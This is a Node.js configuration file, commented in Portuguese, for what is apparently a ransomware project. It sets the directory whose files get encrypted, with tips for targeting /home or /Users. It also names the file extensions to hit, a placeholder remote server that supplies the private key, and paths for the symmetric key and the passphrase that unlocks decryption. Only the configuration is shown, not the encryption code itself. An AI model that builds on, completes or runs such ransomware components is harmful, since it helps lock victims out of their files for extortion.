const path = require("path"); // arqv de conf para saber como o ramws vai operar e oq vai encript para q n ocorra encriptacao da maquina inteira
// path e um modulo nativo do node
const extensions = require("./extensions");


const prodConfig = {
    remoteServer: "http://yourdomain.com",  
    startDirectory: "./files", //linux: /home ; mac: /Users ou outro diretorio, cuidado pra nao fazer caquinha e encriptar tudo por acidente
    extensions, // lista de extensoes
    symetricKeyPath: path.join(__dirname, "..", "secret.key"), //arqv de chave p encriptar os arv sem ter uma chave privada
    privateKeyPath: path.join(__dirname, "..", "private.key"), //chve q vai receber do servidor
    passpharasePath: path.join(__dirname, "..", "passphrase.key"),  // senha utilizada para desbloquear a chave privada que sera enviada pelo servidor, para garntir que se houver prob em descript, o usuario pode reiniciar o processo e desencript os arv q tao localmente
};

module.exports = prodConfig;